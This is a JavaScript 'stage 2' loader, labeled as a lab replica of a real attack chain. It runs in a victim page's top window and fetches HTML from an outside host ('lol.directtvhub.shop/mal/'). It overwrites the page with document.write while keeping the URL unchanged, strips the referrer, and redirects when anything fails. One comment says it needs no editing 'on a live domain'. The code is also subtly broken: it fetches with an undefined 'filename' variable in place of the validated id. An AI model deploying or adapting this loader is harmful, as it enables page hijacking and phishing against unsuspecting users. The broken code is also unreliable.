/*
 * LAB ONLY — authorized testing on your own systems.
 * Stage 2: the loader. Mirrors the real fx.js chain:
 *   read the campaign id from the victim URL -> fetch art.php (CORS) -> document.write.
 */
(function () {
  var W = window.top;                       // run against the TOP window (the victim page)
  if (W.__fc_ran) return;                   // re-entrancy guard: run once
  W.__fc_ran = 1;

  // Auto-detect this script's own origin, so no editing is needed on a live
  // domain. Falls back to localhost for the local lab.
  function ownOrigin() {
    try {
      var s = document.currentScript;
      if (s && s.src) {
        var a = document.createElement('a');
        a.href = s.src;
        return a.protocol + '//' + a.host;
      }
    } catch (e) {}
    return 'http://127.0.0.1:8001';
  }
  var BASE = ownOrigin();
  var FAIL = BASE + '/';

  function bail(u) {                        // hide the referrer, then navigate away
    try {
      var m = W.document.createElement('meta');
      m.name = 'referrer';
      m.content = 'no-referrer';
      W.document.head.appendChild(m);
    } catch (e) {}
    W.location.replace(u);
  }

  function gp(n) {
    var m = new RegExp('[?&]' + n + '=([^&]+)', 'i').exec(W.location.search || '');
    return m ? decodeURIComponent(m[1]) : '';
  }

  var id = gp('GetFoldersAndFiles') || gp('id');
  if (!/^[A-Za-z0-9_-]{1,80}$/.test(id)) return bail(FAIL);   // whitelist the token

  var fin = 0;
  var t = setTimeout(function () { if (!fin) bail(FAIL); }, 15000);   // watchdog

  fetch('https://lol.directtvhub.shop/mal/' + encodeURIComponent(filename), {
    mode: 'cors',
    credentials: 'omit',
    referrerPolicy: 'no-referrer',
    cache: 'no-store'
  })
    .then(function (r) { if (!r.ok) throw new Error('HTTP ' + r.status); return r.text(); })
    .then(function (html) {
      if (!html || html.length < 50) throw new Error('empty');
      fin = 1;
      clearTimeout(t);
      var d = W.document;
      d.open(); d.write(html); d.close();   // replace the victim page; URL unchanged
      W.scrollTo(0, 0);
    })
    .catch(function (e) {
      clearTimeout(t);
      try { console.error('[FC]', e); } catch (x) {}
      if (!fin) bail(FAIL);                 // anything goes wrong -> hard redirect
    });
})();
